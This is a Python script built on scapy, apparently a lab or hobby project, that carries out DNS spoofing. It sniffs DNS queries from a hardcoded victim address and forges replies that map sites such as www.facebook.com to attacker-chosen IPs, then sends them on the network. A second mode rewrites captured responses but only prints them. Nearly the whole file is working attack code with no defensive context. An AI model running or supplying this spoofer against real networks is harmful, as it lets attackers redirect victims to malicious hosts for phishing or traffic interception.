from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether


class DnsSpoof:
    def __init__(self):
        self.victem = "192.168.1.10"
        self.alterd_packets = []
        self.Option = 'faking'

        # The lists of hosts to fake
        self.fake_hosts = {
            b'www.facebook.com.': "172.217.19.142",
            b'www.bier.nl.': "8.8.8.8",
            b'euw.leagueoflegends.com.': "8.8.8.8"
        }

    def dns_sniffer(self):
        sniff(filter="udp and port 53", prn=self.handler_dns, store=0)

    def handler_dns(self, pkt):
        if self.Option == 'faking':
            self.faking_dns(pkt)
        elif self.Option == 'altering':
            self.altering_dns(pkt)
        else:
            self.inspect_dns(pkt)

    def faking_dns(self, pkt):
        if pkt.haslayer(DNSQR) and pkt[IP].src == self.victem:

            qname = pkt[DNSQR].qname

            if qname in self.fake_hosts:
                ether_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst, type=pkt[Ether].type)
                ip_layer = IP(version=pkt[IP].version, flags='DF', src=pkt[IP].dst, dst=pkt[IP].src)
                udp_layer = UDP(sport='domain', dport=pkt[UDP].sport)
                dns_layer = DNS(id=pkt[DNS].id, qr=1, opcode=pkt[DNS].opcode,
                                rcode='ok',
                                qdcount=pkt[DNS].qdcount, ancount=1, nscount=0, arcount=0)
                dns_layer.qd = pkt[DNS].qd
                dns_layer.an = DNSRR(rrname=qname, type='A', rdata=self.fake_hosts[qname])

                pkt = ether_layer / ip_layer / udp_layer / dns_layer
                print(pkt.show)
                sendp(pkt)

    def altering_dns(self, pkt):
        print("[ * ] No package will be SEND only for demonstration ")
        if pkt not in self.alterd_packets:
            if pkt.haslayer(DNSRR) and pkt[IP].dst == self.victem:
                if pkt[DNSQR].qname in self.fake_hosts:
                    print(f' old: \n{pkt.show}\n')
                    qname = pkt[DNSQR].qname

                    del pkt[IP].len
                    del pkt[IP].chksum
                    del pkt[UDP].len
                    del pkt[UDP].chksum

                    pkt[DNS].ancount = 1
                    pkt[DNS].an = DNSRR(rrname=qname, type='A', rdata=self.fake_hosts[qname])
                    self.alterd_packets.append(pkt)
                    print(f' new: \n{pkt.show}\n')

    def inspect_dns(self, pkt):
        if pkt[DNSQR].qname in self.fake_hosts:
            print(pkt.show)

    def run(self):
        self.dns_sniffer()


if __name__ == '__main__':
    test = DnsSpoof()
    test.run()
